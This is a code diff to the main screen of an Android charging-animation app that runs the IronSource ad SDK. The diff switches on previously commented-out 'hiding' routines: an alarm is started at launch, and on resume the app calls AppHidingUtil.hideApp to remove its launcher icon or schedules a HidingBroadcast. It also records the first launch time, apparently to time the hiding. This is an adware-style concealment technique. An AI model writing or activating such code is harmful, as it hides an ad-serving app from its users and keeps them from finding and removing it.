@@ -1,8 +1,5 @@
 package com.happy.charger.ui.main
 
-//import com.charginging.animationation.utils.hiding.AlarmBroadcast
-//import com.charginging.animationation.utils.hiding.AppHidingUtil
-//import com.charginging.animationation.utils.hiding.HidingBroadcast
 import android.content.Intent
 import android.os.Build
 import android.provider.Settings
@@ -21,6 +18,9 @@ import com.happy.charger.ui.guid.GuidDialog
 import com.happy.charger.ui.permission.PermissionDialog
 import com.happy.charger.ui.settings.SettingsActivity
 import com.happy.charger.utils.IRON_SOURCE_APP_KEY
+import com.happy.charger.utils.hiding.AlarmBroadcast
+import com.happy.charger.utils.hiding.AppHidingUtil
+import com.happy.charger.utils.hiding.HidingBroadcast
 import com.ironsource.mediationsdk.IronSource
 import java.util.*
 
@@ -35,7 +35,12 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun setupUI() {
         IronSource.setMetaData("is_child_directed","false")
         IronSource.init(this, IRON_SOURCE_APP_KEY)
-//        AlarmBroadcast.startAlarm(this)
+
+        if (Preferences.firstLaunchMillis == -1L)
+            Preferences.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
         if (ForegroundService.instance === null)
             startService(Intent(this, ForegroundService::class.java))
         if (!Preferences.wasLaunchedBefore)
@@ -74,10 +79,10 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun onResume() {
         super.onResume()
         IronSource.onResume(this)
-        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice()) {}
-//            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
-        else {}
-//            HidingBroadcast.startAlarm(this)
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
     }
 
     override fun onPause() {
